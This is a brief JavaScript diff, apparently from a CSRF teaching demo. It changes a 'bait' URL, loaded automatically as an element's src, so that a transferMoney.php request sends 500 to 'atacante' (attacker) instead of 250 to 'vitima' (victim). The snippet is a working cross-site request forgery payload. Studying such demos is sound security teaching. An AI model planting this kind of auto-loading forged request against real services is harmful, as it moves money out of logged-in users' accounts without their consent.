@@ -22,7 +22,7 @@ function showUser(){
     }
 
     //let root = "floating-ravine-68691.herokuapp.com" ;
-    let bait = "http://beti-csrf.herokuapp.com/transferMoney.php?user=vitima&value=250";
+    let bait = "http://beti-csrf.herokuapp.com/transferMoney.php?user=atacante&value=500";
     //let link = root+bait;
     console.log(bait);
     $("#link").attr("src", bait);
